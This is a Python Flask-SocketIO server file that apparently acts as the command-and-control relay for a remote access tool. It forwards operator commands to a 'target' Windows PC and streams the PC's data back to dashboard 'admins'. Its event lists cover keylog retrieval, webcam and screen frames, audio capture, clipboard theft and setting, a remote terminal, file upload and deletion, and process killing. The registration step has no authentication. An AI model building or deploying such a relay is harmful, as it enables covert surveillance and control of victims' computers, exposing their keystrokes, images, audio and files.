import os
from flask import Flask, render_template, request, Response
from flask_socketio import SocketIO, emit

app = Flask(__name__)
app.config['SECRET_KEY'] = 'sk-hackerai-supersecret'

# Setup SocketIO
# Max HTTP Buffer for file uploads (50MB)
socketio = SocketIO(app, cors_allowed_origins="*", max_http_buffer_size=50 * 1024 * 1024)

# Keep track of active connections
target_sid = None  # The Windows PC SID
admin_sids = set() # Browsers connecting to dashboard

# ============================================================
#  HTTP Routes
# ============================================================
@app.route('/')
def control_room():
    return render_template('control.html')

@app.route('/status')
def status():
    return {
        'target_online': target_sid is not None,
        'admins_online': len(admin_sids)
    }

# ============================================================
#  Connection Handlers
# ============================================================
@socketio.on('connect')
def handle_connect():
    pass # Wait for explicit auth event to register

@socketio.on('disconnect')
def handle_disconnect():
    global target_sid
    sid = request.sid
    if sid == target_sid:
        target_sid = None
        print("❌ Target Windows PC Disconnected")
        emit('target_status', {'online': False}, to=None, broadcast=True)
    elif sid in admin_sids:
        admin_sids.remove(sid)
        print(f"❌ Admin Screen Disconnected ({sid})")

@socketio.on('register')
def handle_register(data):
    global target_sid
    role = data.get('role')
    sid = request.sid
    
    if role == 'target':
        target_sid = sid
        print(f"🔥 TARGET CONNECTED: {sid}")
        emit('target_status', {'online': True}, broadcast=True)
    elif role == 'admin':
        admin_sids.add(sid)
        print(f"👁️ ADMIN CONNECTED: {sid}")
        # Tell admin if target is online
        emit('target_status', {'online': target_sid is not None}, to=sid)

# ============================================================
#  Proxy: ADMIN -> TARGET
# ============================================================
# The admin sends commands here, we forward them strictly to the Target.
def forward_to_target(*args):
    event = args[0]
    data = args[1] if len(args) > 1 else {}
    if target_sid:
        socketio.emit(event, data, to=target_sid)
    else:
        emit('server_error', {'error': 'Target PC is offline.'})

# Admin requests to Target
ADMIN_TO_TARGET_EVENTS = [
    'mouse', 'keyboard', 'system',
    'terminal_start', 'terminal_input', 'terminal_stop',
    'file_browse', 'file_upload', 'file_delete',
    'process_list', 'process_kill',
    'audio_start', 'audio_stop',
    'vitals_start', 'vitals_stop',
    'monitor_list', 'monitor_switch',
    'keylog_fetch', 'keylog_clear',
    'clipboard_get', 'clipboard_set',
    'chat_send', 'chat_history', 'alert_send'
]

for event in ADMIN_TO_TARGET_EVENTS:
    # Capturing the event name in the lambda requires default args trick
    socketio.on_event(event, lambda data, e=event: forward_to_target(e, data))


# ============================================================
#  Proxy: TARGET -> ADMIN
# ============================================================
# The target sends frames/data here, we broadcast them to all connected admins.
def forward_to_admins(*args):
    event = args[0]
    data = args[1] if len(args) > 1 else {}
    for sid in admin_sids:
        socketio.emit(event, data, to=sid)

TARGET_TO_ADMIN_EVENTS = [
    'init', 'screen_frame', 'webcam_frame',
    'screenshot', 'terminal_started', 'terminal_output',
    'file_list', 'file_upload_status', 'file_delete_status',
    'process_data', 'process_kill_status',
    'audio_started', 'audio_stopped', 'audio_chunk', 'audio_error',
    'vitals_update',
    'monitor_data', 'monitor_switched',
    'keylog_data', 'keylog_cleared',
    'clipboard_content', 'clipboard_status',
    'chat_received', 'chat_data', 'alert_sent'
]

for event in TARGET_TO_ADMIN_EVENTS:
    socketio.on_event(event, lambda data, e=event: forward_to_admins(e, data))

# ============================================================
#  Run Server
# ============================================================
if __name__ == '__main__':
    port = int(os.environ.get('PORT', 8080))
    socketio.run(app, host='0.0.0.0', port=port, debug=False, allow_unsafe_werkzeug=True)
